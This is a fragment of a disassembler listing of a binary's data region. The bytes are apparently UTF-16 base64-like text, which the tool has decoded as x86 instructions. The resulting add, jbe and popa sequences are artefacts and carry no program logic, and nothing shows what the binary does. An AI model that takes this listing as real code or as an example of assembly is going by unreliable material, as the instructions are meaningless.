  409c5b:	00 43 00             	add    %al,0x0(%ebx)
  409c5e:	76 00                	jbe    0x409c60
  409c60:	2f                   	das
  409c61:	00 51 00             	add    %dl,0x0(%ecx)
  409c64:	74 00                	je     0x409c66
  409c66:	61                   	popa
  409c67:	00 5a 00             	add    %bl,0x0(%edx)
  409c6a:	4a                   	dec    %edx
  409c6b:	00 45 00             	add    %al,0x0(%ebp)
  409c6e:	76 00                	jbe    0x409c70
  409c70:	4e                   	dec    %esi
  409c71:	00 45 00             	add    %al,0x0(%ebp)
  409c74:	2f                   	das
  409c75:	00 79 00             	add    %bh,0x0(%ecx)
  409c78:	4f                   	dec    %edi
  409c79:	00 6f 00             	add    %ch,0x0(%edi)
  409c7c:	78 00                	js     0x409c7e
  409c7e:	47                   	inc    %edi
  409c7f:	00 2b                	add    %ch,(%ebx)
  409c81:	00 46 00             	add    %al,0x0(%esi)
  409c84:	32 00                	xor    (%eax),%al
  409c86:	32 00                	xor    (%eax),%al
  409c88:	68 00 31 00 6e       	push   $0x6e003100
  409c8d:	00 4d 00             	add    %cl,0x0(%ebp)
  409c90:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  409c94:	6c                   	insb   (%dx),%es:(%edi)
  409c95:	00 78 00             	add    %bh,0x0(%eax)
  409c98:	5a                   	pop    %edx
  409c99:	00 4e 00             	add    %cl,0x0(%esi)
  409c9c:	7a 00                	jp     0x409c9e
  409c9e:	45                   	inc    %ebp
  409c9f:	00 37                	add    %dh,(%edi)
  409ca1:	00 42 00             	add    %al,0x0(%edx)
  409ca4:	74 00                	je     0x409ca6
  409ca6:	5a                   	pop    %edx
  409ca7:	00 51 00             	add    %dl,0x0(%ecx)
  409caa:	4c                   	dec    %esp
  409cab:	00 68 00             	add    %ch,0x0(%eax)
  409cae:	78 00                	js     0x409cb0
  409cb0:	50                   	push   %eax
  409cb1:	00 51 00             	add    %dl,0x0(%ecx)
  409cb4:	6b 00 58             	imul   $0x58,(%eax),%eax
  409cb7:	00 6f 00             	add    %ch,0x0(%edi)
  409cba:	71 00                	jno    0x409cbc
  409cbc:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  409cc0:	76 00                	jbe    0x409cc2
  409cc2:	57                   	push   %edi
  409cc3:	00 5a 00             	add    %bl,0x0(%edx)
  409cc6:	7a 00                	jp     0x409cc8
  409cc8:	46                   	inc    %esi
  409cc9:	00 75 00             	add    %dh,0x0(%ebp)
  409ccc:	35 00 33 00 44       	xor    $0x44003300,%eax
  409cd1:	00 55 00             	add    %dl,0x0(%ebp)
  409cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  409cd5:	00 35 00 38 00 65    	add    %dh,0x65003800
  409cdb:	00 59 00             	add    %bl,0x0(%ecx)
  409cde:	4c                   	dec    %esp
  409cdf:	00 73 00             	add    %dh,0x0(%ebx)
  409ce2:	4a                   	dec    %edx
  409ce3:	00 53 00             	add    %dl,0x0(%ebx)
  409ce6:	4d                   	dec    %ebp
  409ce7:	00 46 00             	add    %al,0x0(%esi)
  409cea:	62 00                	bound  %eax,(%eax)
  409cec:	7a 00                	jp     0x409cee
  409cee:	79 00                	jns    0x409cf0
  409cf0:	37                   	aaa
  409cf1:	00 41 00             	add    %al,0x0(%ecx)
  409cf4:	55                   	push   %ebp
  409cf5:	00 2f                	add    %ch,(%edi)
  409cf7:	00 33                	add    %dh,(%ebx)
  409cf9:	00 35 00 6c 00 6e    	add    %dh,0x6e006c00
  409cff:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  409d03:	00 58 00             	add    %bl,0x0(%eax)
  409d06:	57                   	push   %edi
  409d07:	00 75 00             	add    %dh,0x0(%ebp)
  409d0a:	76 00                	jbe    0x409d0c
  409d0c:	49                   	dec    %ecx
  409d0d:	00 42 00             	add    %al,0x0(%edx)
  409d10:	66 00 46 00          	data16 add %al,0x0(%esi)
  409d14:	6e                   	outsb  %ds:(%esi),(%dx)
  409d15:	00 66 00             	add    %ah,0x0(%esi)
  409d18:	4d                   	dec    %ebp
  409d19:	00 6e 00             	add    %ch,0x0(%esi)
  409d1c:	6c                   	insb   (%dx),%es:(%edi)
  409d1d:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  409d21:	00 75 00             	add    %dh,0x0(%ebp)
  409d24:	67 00 39             	add    %bh,(%bx,%di)
  409d27:	00 38                	add    %bh,(%eax)
  409d29:	00 4b 00             	add    %cl,0x0(%ebx)
  409d2c:	46                   	inc    %esi
  409d2d:	00 7a 00             	add    %bh,0x0(%edx)
  409d30:	4b                   	dec    %ebx
  409d31:	00 4d 00             	add    %cl,0x0(%ebp)
  409d34:	48                   	dec    %eax
  409d35:	00 56 00             	add    %dl,0x0(%esi)
  409d38:	53                   	push   %ebx
  409d39:	00 67 00             	add    %ah,0x0(%edi)
  409d3c:	52                   	push   %edx
  409d3d:	00 77 00             	add    %dh,0x0(%edi)
  409d40:	37                   	aaa
  409d41:	00 4a 00             	add    %cl,0x0(%edx)
  409d44:	6c                   	insb   (%dx),%es:(%edi)
  409d45:	00 36                	add    %dh,(%esi)
  409d47:	00 77 00             	add    %dh,0x0(%edi)
  409d4a:	2f                   	das
  409d4b:	00 51 00             	add    %dl,0x0(%ecx)
  409d4e:	5a                   	pop    %edx
  409d4f:	00 52 00             	add    %dl,0x0(%edx)
  409d52:	6f                   	outsl  %ds:(%esi),(%dx)
  409d53:	00 6a 00             	add    %ch,0x0(%edx)
  409d56:	57                   	push   %edi
  409d57:	00 4e 00             	add    %cl,0x0(%esi)
  409d5a:	71 00                	jno    0x409d5c
  409d5c:	58                   	pop    %eax
  409d5d:	00 73 00             	add    %dh,0x0(%ebx)
  409d60:	33 00                	xor    (%eax),%eax
  409d62:	73 00                	jae    0x409d64
  409d64:	38 00                	cmp    %al,(%eax)
  409d66:	69 00 71 00 47 00    	imul   $0x470071,(%eax),%eax
  409d6c:	4b                   	dec    %ebx
  409d6d:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  409d71:	00 4d 00             	add    %cl,0x0(%ebp)
  409d74:	31 00                	xor    %eax,(%eax)
  409d76:	75 00                	jne    0x409d78
  409d78:	32 00                	xor    (%eax),%al
  409d7a:	6d                   	insl   (%dx),%es:(%edi)
  409d7b:	00 4f 00             	add    %cl,0x0(%edi)
  409d7e:	42                   	inc    %edx
  409d7f:	00 73 00             	add    %dh,0x0(%ebx)
  409d82:	6f                   	outsl  %ds:(%esi),(%dx)
  409d83:	00 56 00             	add    %dl,0x0(%esi)
  409d86:	57                   	push   %edi
  409d87:	00 33                	add    %dh,(%ebx)
  409d89:	00 72 00             	add    %dh,0x0(%edx)
  409d8c:	79 00                	jns    0x409d8e
  409d8e:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  409d92:	42                   	inc    %edx
  409d93:	00 63 00             	add    %ah,0x0(%ebx)
  409d96:	69 00 51 00 62 00    	imul   $0x620051,(%eax),%eax
  409d9c:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  409da0:	43                   	inc    %ebx
  409da1:	00 53 00             	add    %dl,0x0(%ebx)
  409da4:	34 00                	xor    $0x0,%al
  409da6:	74 00                	je     0x409da8
  409da8:	72 00                	jb     0x409daa
  409daa:	36 00 33             	add    %dh,%ss:(%ebx)
  409dad:	00 53 00             	add    %dl,0x0(%ebx)
  409db0:	39 00                	cmp    %eax,(%eax)
  409db2:	72 00                	jb     0x409db4
  409db4:	7a 00                	jp     0x409db6
  409db6:	47                   	inc    %edi
  409db7:	00 78 00             	add    %bh,0x0(%eax)
  409dba:	6c                   	insb   (%dx),%es:(%edi)
  409dbb:	00 6b 00             	add    %ch,0x0(%ebx)
  409dbe:	74 00                	je     0x409dc0
  409dc0:	6e                   	outsb  %ds:(%esi),(%dx)
  409dc1:	00 72 00             	add    %dh,0x0(%edx)
  409dc4:	73 00                	jae    0x409dc6
  409dc6:	75 00                	jne    0x409dc8
  409dc8:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  409dcc:	77 00                	ja     0x409dce
  409dce:	56                   	push   %esi
  409dcf:	00 46 00             	add    %al,0x0(%esi)
  409dd2:	48                   	dec    %eax
  409dd3:	00 4f 00             	add    %cl,0x0(%edi)
  409dd6:	32 00                	xor    (%eax),%al
  409dd8:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  409ddc:	52                   	push   %edx
  409ddd:	00 57 00             	add    %dl,0x0(%edi)
  409de0:	6d                   	insl   (%dx),%es:(%edi)
  409de1:	00 4f 00             	add    %cl,0x0(%edi)
  409de4:	59                   	pop    %ecx
  409de5:	00 7a 00             	add    %bh,0x0(%edx)
  409de8:	35 00 31 00 62       	xor    $0x62003100,%eax
  409ded:	00 34 00             	add    %dh,(%eax,%eax,1)
  409df0:	54                   	push   %esp
  409df1:	00 4e 00             	add    %cl,0x0(%esi)
  409df4:	64 00 39             	add    %bh,%fs:(%ecx)
  409df7:	00 68 00             	add    %ch,0x0(%eax)
  409dfa:	68 00 71 00 79       	push   $0x79007100
  409dff:	00 4a 00             	add    %cl,0x0(%edx)
  409e02:	63 00                	arpl   %eax,(%eax)
  409e04:	6a 00                	push   $0x0
  409e06:	72 00                	jb     0x409e08
  409e08:	34 00                	xor    $0x0,%al
  409e0a:	59                   	pop    %ecx
  409e0b:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  409e0f:	00 42 00             	add    %al,0x0(%edx)
  409e12:	4e                   	dec    %esi
  409e13:	00 36                	add    %dh,(%esi)
  409e15:	00 4e 00             	add    %cl,0x0(%esi)
  409e18:	4a                   	dec    %edx
  409e19:	00 43 00             	add    %al,0x0(%ebx)
  409e1c:	59                   	pop    %ecx
  409e1d:	00 56 00             	add    %dl,0x0(%esi)
  409e20:	2f                   	das
  409e21:	00 59 00             	add    %bl,0x0(%ecx)
  409e24:	6f                   	outsl  %ds:(%esi),(%dx)
  409e25:	00 41 00             	add    %al,0x0(%ecx)
  409e28:	39 00                	cmp    %eax,(%eax)
  409e2a:	69 00 61 00 37 00    	imul   $0x370061,(%eax),%eax
  409e30:	78 00                	js     0x409e32
  409e32:	45                   	inc    %ebp
  409e33:	00 2f                	add    %ch,(%edi)
  409e35:	00 71 00             	add    %dh,0x0(%ecx)
  409e38:	76 00                	jbe    0x409e3a
  409e3a:	52                   	push   %edx
  409e3b:	00 62 00             	add    %ah,0x0(%edx)
  409e3e:	79 00                	jns    0x409e40
  409e40:	63 00                	arpl   %eax,(%eax)
  409e42:	50                   	push   %eax
  409e43:	00 4d 00             	add    %cl,0x0(%ebp)
  409e46:	74 00                	je     0x409e48
  409e48:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  409e4c:	4a                   	dec    %edx
  409e4d:	00 75 00             	add    %dh,0x0(%ebp)
  409e50:	35 00 55 00 4b       	xor    $0x4b005500,%eax
  409e55:	00 73 00             	add    %dh,0x0(%ebx)
  409e58:	33 00                	xor    (%eax),%eax
  409e5a:	34 00                	xor    $0x0,%al
  409e5c:	76 00                	jbe    0x409e5e
  409e5e:	6a 00                	push   $0x0
  409e60:	70 00                	jo     0x409e62
  409e62:	56                   	push   %esi
  409e63:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  409e67:	00 42 00             	add    %al,0x0(%edx)
  409e6a:	51                   	push   %ecx
  409e6b:	00 35 00 70 00 73    	add    %dh,0x73007000
  409e71:	00 50 00             	add    %dl,0x0(%eax)
  409e74:	69 00 51 00 4d 00    	imul   $0x4d0051,(%eax),%eax
  409e7a:	71 00                	jno    0x409e7c
  409e7c:	44                   	inc    %esp
  409e7d:	00 76 00             	add    %dh,0x0(%esi)
  409e80:	71 00                	jno    0x409e82
  409e82:	76 00                	jbe    0x409e84
  409e84:	67 00 2f             	add    %ch,(%bx)
  409e87:	00 31                	add    %dh,(%ecx)
  409e89:	00 59 00             	add    %bl,0x0(%ecx)
  409e8c:	73 00                	jae    0x409e8e
  409e8e:	56                   	push   %esi
  409e8f:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  409e93:	00 79 00             	add    %bh,0x0(%ecx)
  409e96:	4c                   	dec    %esp
  409e97:	00 50 00             	add    %dl,0x0(%eax)
  409e9a:	75 00                	jne    0x409e9c
  409e9c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409ea0:	2b 00                	sub    (%eax),%eax
  409ea2:	4c                   	dec    %esp
  409ea3:	00 36                	add    %dh,(%esi)
  409ea5:	00 4e 00             	add    %cl,0x0(%esi)
  409ea8:	73 00                	jae    0x409eaa
  409eaa:	6e                   	outsb  %ds:(%esi),(%dx)
  409eab:	00 67 00             	add    %ah,0x0(%edi)
  409eae:	75 00                	jne    0x409eb0
  409eb0:	32 00                	xor    (%eax),%al
  409eb2:	4d                   	dec    %ebp
  409eb3:	00 78 00             	add    %bh,0x0(%eax)
  409eb6:	69 00 42 00 4e 00    	imul   $0x4e0042,(%eax),%eax
  409ebc:	77 00                	ja     0x409ebe
  409ebe:	66 00 78 00          	data16 add %bh,0x0(%eax)
  409ec2:	31 00                	xor    %eax,(%eax)
  409ec4:	79 00                	jns    0x409ec6
  409ec6:	4a                   	dec    %edx
  409ec7:	00 50 00             	add    %dl,0x0(%eax)
  409eca:	75 00                	jne    0x409ecc
  409ecc:	55                   	push   %ebp
  409ecd:	00 71 00             	add    %dh,0x0(%ecx)
  409ed0:	41                   	inc    %ecx
  409ed1:	00 6f 00             	add    %ch,0x0(%edi)
  409ed4:	32 00                	xor    (%eax),%al
  409ed6:	48                   	dec    %eax
  409ed7:	00 56 00             	add    %dl,0x0(%esi)
  409eda:	34 00                	xor    $0x0,%al
  409edc:	4c                   	dec    %esp
  409edd:	00 38                	add    %bh,(%eax)
  409edf:	00 5a 00             	add    %bl,0x0(%edx)
  409ee2:	78 00                	js     0x409ee4
  409ee4:	70 00                	jo     0x409ee6
  409ee6:	4d                   	dec    %ebp
  409ee7:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  409eeb:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  409eef:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  409ef3:	00 39                	add    %bh,(%ecx)
  409ef5:	00 66 00             	add    %ah,0x0(%esi)
  409ef8:	44                   	inc    %esp
  409ef9:	00 45 00             	add    %al,0x0(%ebp)
  409efc:	47                   	inc    %edi
  409efd:	00 62 00             	add    %ah,0x0(%edx)
  409f00:	47                   	inc    %edi
  409f01:	00 2f                	add    %ch,(%edi)
  409f03:	00 2b                	add    %ch,(%ebx)
  409f05:	00 55 00             	add    %dl,0x0(%ebp)
  409f08:	48                   	dec    %eax
  409f09:	00 78 00             	add    %bh,0x0(%eax)
  409f0c:	33 00                	xor    (%eax),%eax
  409f0e:	57                   	push   %edi
  409f0f:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  409f13:	00 4d 00             	add    %cl,0x0(%ebp)
  409f16:	49                   	dec    %ecx
  409f17:	00 52 00             	add    %dl,0x0(%edx)
  409f1a:	78 00                	js     0x409f1c
  409f1c:	71 00                	jno    0x409f1e
  409f1e:	4f                   	dec    %edi
  409f1f:	00 43 00             	add    %al,0x0(%ebx)
  409f22:	59                   	pop    %ecx
  409f23:	00 6d 00             	add    %ch,0x0(%ebp)
  409f26:	56                   	push   %esi
  409f27:	00 42 00             	add    %al,0x0(%edx)
  409f2a:	68 00 42 00 75       	push   $0x75004200
  409f2f:	00 4b 00             	add    %cl,0x0(%ebx)
  409f32:	77 00                	ja     0x409f34
  409f34:	42                   	inc    %edx
  409f35:	00 53 00             	add    %dl,0x0(%ebx)
  409f38:	4b                   	dec    %ebx
  409f39:	00 78 00             	add    %bh,0x0(%eax)
  409f3c:	64 00 2f             	add    %ch,%fs:(%edi)
  409f3f:	00 78 00             	add    %bh,0x0(%eax)
  409f42:	51                   	push   %ecx
  409f43:	00 4a 00             	add    %cl,0x0(%edx)
  409f46:	46                   	inc    %esi
  409f47:	00 30                	add    %dh,(%eax)
  409f49:	00 68 00             	add    %ch,0x0(%eax)
  409f4c:	6b 00 58             	imul   $0x58,(%eax),%eax
  409f4f:	00 70 00             	add    %dh,0x0(%eax)
  409f52:	79 00                	jns    0x409f54
  409f54:	34 00                	xor    $0x0,%al
  409f56:	66 00 45 00          	data16 add %al,0x0(%ebp)
  409f5a:	37                   	aaa
  409f5b:	00 5a 00             	add    %bl,0x0(%edx)
  409f5e:	52                   	push   %edx
  409f5f:	00 71 00             	add    %dh,0x0(%ecx)
  409f62:	73 00                	jae    0x409f64
  409f64:	4f                   	dec    %edi
  409f65:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  409f69:	00 65 00             	add    %ah,0x0(%ebp)
  409f6c:	46                   	inc    %esi
  409f6d:	00 39                	add    %bh,(%ecx)
  409f6f:	00 2f                	add    %ch,(%edi)
  409f71:	00 4f 00             	add    %cl,0x0(%edi)
  409f74:	61                   	popa
  409f75:	00 51 00             	add    %dl,0x0(%ecx)
  409f78:	79 00                	jns    0x409f7a
  409f7a:	48                   	dec    %eax
  409f7b:	00 58 00             	add    %bl,0x0(%eax)
  409f7e:	70 00                	jo     0x409f80
  409f80:	46                   	inc    %esi
  409f81:	00 33                	add    %dh,(%ebx)
  409f83:	00 2f                	add    %ch,(%edi)
  409f85:	00 6e 00             	add    %ch,0x0(%esi)
  409f88:	37                   	aaa
  409f89:	00 38                	add    %bh,(%eax)
  409f8b:	00 2f                	add    %ch,(%edi)
  409f8d:	00 2b                	add    %ch,(%ebx)
  409f8f:	00 38                	add    %bh,(%eax)
  409f91:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f94:	6d                   	insl   (%dx),%es:(%edi)
  409f95:	00 51 00             	add    %dl,0x0(%ecx)
  409f98:	63 00                	arpl   %eax,(%eax)
  409f9a:	73 00                	jae    0x409f9c
  409f9c:	43                   	inc    %ebx
  409f9d:	00 6d 00             	add    %ch,0x0(%ebp)
  409fa0:	5a                   	pop    %edx
  409fa1:	00 51 00             	add    %dl,0x0(%ecx)
  409fa4:	35 00 6f 00 62       	xor    $0x62006f00,%eax
  409fa9:	00 31                	add    %dh,(%ecx)
  409fab:	00 41 00             	add    %al,0x0(%ecx)
  409fae:	37                   	aaa
  409faf:	00 45 00             	add    %al,0x0(%ebp)
  409fb2:	54                   	push   %esp
  409fb3:	00 42 00             	add    %al,0x0(%edx)
  409fb6:	66 00 64 00 2f       	data16 add %ah,0x2f(%eax,%eax,1)
  409fbb:	00 70 00             	add    %dh,0x0(%eax)
  409fbe:	73 00                	jae    0x409fc0
  409fc0:	33 00                	xor    (%eax),%eax
  409fc2:	41                   	inc    %ecx
  409fc3:	00 62 00             	add    %ah,0x0(%edx)
  409fc6:	66 00 68 00          	data16 add %ch,0x0(%eax)
  409fca:	44                   	inc    %esp
  409fcb:	00 61 00             	add    %ah,0x0(%ecx)
  409fce:	2f                   	das
  409fcf:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  409fd3:	00 79 00             	add    %bh,0x0(%ecx)
  409fd6:	6e                   	outsb  %ds:(%esi),(%dx)
  409fd7:	00 50 00             	add    %dl,0x0(%eax)
  409fda:	59                   	pop    %ecx
  409fdb:	00 49 00             	add    %cl,0x0(%ecx)
  409fde:	6b 00 73             	imul   $0x73,(%eax),%eax
  409fe1:	00 47 00             	add    %al,0x0(%edi)
  409fe4:	58                   	pop    %eax
  409fe5:	00 46 00             	add    %al,0x0(%esi)
  409fe8:	4f                   	dec    %edi
  409fe9:	00 2f                	add    %ch,(%edi)
  409feb:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  409fef:	00 4a 00             	add    %cl,0x0(%edx)
  409ff2:	53                   	push   %ebx
  409ff3:	00 65 00             	add    %ah,0x0(%ebp)
  409ff6:	69 00 58 00 49 00    	imul   $0x490058,(%eax),%eax
  409ffc:	34 00                	xor    $0x0,%al
  409ffe:	2b 00                	sub    (%eax),%eax
  40a000:	50                   	push   %eax
  40a001:	00 37                	add    %dh,(%edi)
  40a003:	00 66 00             	add    %ah,0x0(%esi)
  40a006:	4e                   	dec    %esi
  40a007:	00 71 00             	add    %dh,0x0(%ecx)
  40a00a:	6c                   	insb   (%dx),%es:(%edi)
  40a00b:	00 43 00             	add    %al,0x0(%ebx)
  40a00e:	68 00 49 00 61       	push   $0x61004900
  40a013:	00 57 00             	add    %dl,0x0(%edi)
  40a016:	6a 00                	push   $0x0
  40a018:	32 00                	xor    (%eax),%al
  40a01a:	69 00 57 00 4a 00    	imul   $0x4a0057,(%eax),%eax
  40a020:	62 00                	bound  %eax,(%eax)
  40a022:	30 00                	xor    %al,(%eax)
  40a024:	39 00                	cmp    %eax,(%eax)
  40a026:	6d                   	insl   (%dx),%es:(%edi)
  40a027:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a02a:	58                   	pop    %eax
  40a02b:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40a02f:	00 73 00             	add    %dh,0x0(%ebx)
  40a032:	78 00                	js     0x40a034
  40a034:	76 00                	jbe    0x40a036
  40a036:	62 00                	bound  %eax,(%eax)
  40a038:	54                   	push   %esp
  40a039:	00 49 00             	add    %cl,0x0(%ecx)
  40a03c:	4f                   	dec    %edi
  40a03d:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40a041:	00 75 00             	add    %dh,0x0(%ebp)
  40a044:	43                   	inc    %ebx
  40a045:	00 58 00             	add    %bl,0x0(%eax)
  40a048:	62 00                	bound  %eax,(%eax)
  40a04a:	6d                   	insl   (%dx),%es:(%edi)
  40a04b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a04e:	54                   	push   %esp
  40a04f:	00 72 00             	add    %dh,0x0(%edx)
  40a052:	68 00 4b 00 5a       	push   $0x5a004b00
  40a057:	00 50 00             	add    %dl,0x0(%eax)
  40a05a:	36 00 44 00 66       	add    %al,%ss:0x66(%eax,%eax,1)
  40a05f:	00 4e 00             	add    %cl,0x0(%esi)
  40a062:	59                   	pop    %ecx
  40a063:	00 48 00             	add    %cl,0x0(%eax)
  40a066:	68 00 6b 00 69       	push   $0x69006b00
  40a06b:	00 37                	add    %dh,(%edi)
  40a06d:	00 4a 00             	add    %cl,0x0(%edx)
  40a070:	56                   	push   %esi
  40a071:	00 53 00             	add    %dl,0x0(%ebx)
  40a074:	63 00                	arpl   %eax,(%eax)
  40a076:	59                   	pop    %ecx
  40a077:	00 62 00             	add    %ah,0x0(%edx)
  40a07a:	41                   	inc    %ecx
  40a07b:	00 55 00             	add    %dl,0x0(%ebp)
  40a07e:	6c                   	insb   (%dx),%es:(%edi)
  40a07f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a082:	74 00                	je     0x40a084
  40a084:	62 00                	bound  %eax,(%eax)
  40a086:	41                   	inc    %ecx
  40a087:	00 50 00             	add    %dl,0x0(%eax)
  40a08a:	74 00                	je     0x40a08c
  40a08c:	37                   	aaa
  40a08d:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40a091:	00 4b 00             	add    %cl,0x0(%ebx)
  40a094:	39 00                	cmp    %eax,(%eax)
  40a096:	33 00                	xor    (%eax),%eax
  40a098:	61                   	popa
  40a099:	00 59 00             	add    %bl,0x0(%ecx)
  40a09c:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a0a0:	38 00                	cmp    %al,(%eax)
  40a0a2:	4c                   	dec    %esp
  40a0a3:	00 41 00             	add    %al,0x0(%ecx)
  40a0a6:	77 00                	ja     0x40a0a8
  40a0a8:	55                   	push   %ebp
  40a0a9:	00 75 00             	add    %dh,0x0(%ebp)
  40a0ac:	49                   	dec    %ecx
  40a0ad:	00 76 00             	add    %dh,0x0(%esi)
  40a0b0:	6a 00                	push   $0x0
  40a0b2:	45                   	inc    %ebp
  40a0b3:	00 32                	add    %dh,(%edx)
  40a0b5:	00 33                	add    %dh,(%ebx)
  40a0b7:	00 46 00             	add    %al,0x0(%esi)
  40a0ba:	50                   	push   %eax
  40a0bb:	00 63 00             	add    %ah,0x0(%ebx)
  40a0be:	76 00                	jbe    0x40a0c0
  40a0c0:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40a0c4:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40a0c7:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0ca:	2b 00                	sub    (%eax),%eax
  40a0cc:	52                   	push   %edx
  40a0cd:	00 37                	add    %dh,(%edi)
  40a0cf:	00 4e 00             	add    %cl,0x0(%esi)
  40a0d2:	41                   	inc    %ecx
  40a0d3:	00 78 00             	add    %bh,0x0(%eax)
  40a0d6:	2b 00                	sub    (%eax),%eax
  40a0d8:	4c                   	dec    %esp
  40a0d9:	00 47 00             	add    %al,0x0(%edi)
  40a0dc:	2b 00                	sub    (%eax),%eax
  40a0de:	4b                   	dec    %ebx
  40a0df:	00 30                	add    %dh,(%eax)
  40a0e1:	00 63 00             	add    %ah,0x0(%ebx)
  40a0e4:	6a 00                	push   $0x0
  40a0e6:	49                   	dec    %ecx
  40a0e7:	00 63 00             	add    %ah,0x0(%ebx)
  40a0ea:	72 00                	jb     0x40a0ec
  40a0ec:	45                   	inc    %ebp
  40a0ed:	00 43 00             	add    %al,0x0(%ebx)
  40a0f0:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40a0f4:	44                   	inc    %esp
  40a0f5:	00 39                	add    %bh,(%ecx)
  40a0f7:	00 6f 00             	add    %ch,0x0(%edi)
  40a0fa:	58                   	pop    %eax
  40a0fb:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a0ff:	00 78 00             	add    %bh,0x0(%eax)
  40a102:	5a                   	pop    %edx
  40a103:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40a107:	00 6d 00             	add    %ch,0x0(%ebp)
  40a10a:	2b 00                	sub    (%eax),%eax
  40a10c:	5a                   	pop    %edx
  40a10d:	00 67 00             	add    %ah,0x0(%edi)
  40a110:	39 00                	cmp    %eax,(%eax)
  40a112:	48                   	dec    %eax
  40a113:	00 57 00             	add    %dl,0x0(%edi)
  40a116:	45                   	inc    %ebp
  40a117:	00 39                	add    %bh,(%ecx)
  40a119:	00 30                	add    %dh,(%eax)
  40a11b:	00 77 00             	add    %dh,0x0(%edi)
  40a11e:	2f                   	das
  40a11f:	00 46 00             	add    %al,0x0(%esi)
  40a122:	4e                   	dec    %esi
  40a123:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a127:	00 4e 00             	add    %cl,0x0(%esi)
  40a12a:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40a12e:	34 00                	xor    $0x0,%al
  40a130:	52                   	push   %edx
  40a131:	00 43 00             	add    %al,0x0(%ebx)
  40a134:	42                   	inc    %edx
  40a135:	00 72 00             	add    %dh,0x0(%edx)
  40a138:	59                   	pop    %ecx
  40a139:	00 6a 00             	add    %ch,0x0(%edx)
  40a13c:	42                   	inc    %edx
  40a13d:	00 7a 00             	add    %bh,0x0(%edx)
  40a140:	4a                   	dec    %edx
  40a141:	00 57 00             	add    %dl,0x0(%edi)
  40a144:	79 00                	jns    0x40a146
  40a146:	6a 00                	push   $0x0
  40a148:	41                   	inc    %ecx
  40a149:	00 78 00             	add    %bh,0x0(%eax)
  40a14c:	46                   	inc    %esi
  40a14d:	00 56 00             	add    %dl,0x0(%esi)
  40a150:	6a 00                	push   $0x0
  40a152:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40a155:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a158:	6a 00                	push   $0x0
  40a15a:	58                   	pop    %eax
  40a15b:	00 79 00             	add    %bh,0x0(%ecx)
  40a15e:	55                   	push   %ebp
  40a15f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a162:	43                   	inc    %ebx
  40a163:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40a167:	00 67 00             	add    %ah,0x0(%edi)
  40a16a:	67 00 57 00          	add    %dl,0x0(%bx)
  40a16e:	46                   	inc    %esi
  40a16f:	00 70 00             	add    %dh,0x0(%eax)
  40a172:	76 00                	jbe    0x40a174
  40a174:	75 00                	jne    0x40a176
  40a176:	49                   	dec    %ecx
  40a177:	00 50 00             	add    %dl,0x0(%eax)
  40a17a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a17b:	00 67 00             	add    %ah,0x0(%edi)
  40a17e:	44                   	inc    %esp
  40a17f:	00 70 00             	add    %dh,0x0(%eax)
  40a182:	63 00                	arpl   %eax,(%eax)
  40a184:	43                   	inc    %ebx
  40a185:	00 6f 00             	add    %ch,0x0(%edi)
  40a188:	57                   	push   %edi
  40a189:	00 49 00             	add    %cl,0x0(%ecx)
  40a18c:	61                   	popa
  40a18d:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40a191:	00 55 00             	add    %dl,0x0(%ebp)
  40a194:	70 00                	jo     0x40a196
  40a196:	2f                   	das
  40a197:	00 7a 00             	add    %bh,0x0(%edx)
  40a19a:	76 00                	jbe    0x40a19c
  40a19c:	7a 00                	jp     0x40a19e
  40a19e:	32 00                	xor    (%eax),%al
  40a1a0:	54                   	push   %esp
  40a1a1:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40a1a5:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  40a1a9:	00 4f 00             	add    %cl,0x0(%edi)
  40a1ac:	6c                   	insb   (%dx),%es:(%edi)
  40a1ad:	00 42 00             	add    %al,0x0(%edx)
  40a1b0:	44                   	inc    %esp
  40a1b1:	00 71 00             	add    %dh,0x0(%ecx)
  40a1b4:	2f                   	das
  40a1b5:	00 7a 00             	add    %bh,0x0(%edx)
  40a1b8:	39 00                	cmp    %eax,(%eax)
  40a1ba:	51                   	push   %ecx
  40a1bb:	00 2f                	add    %ch,(%edi)
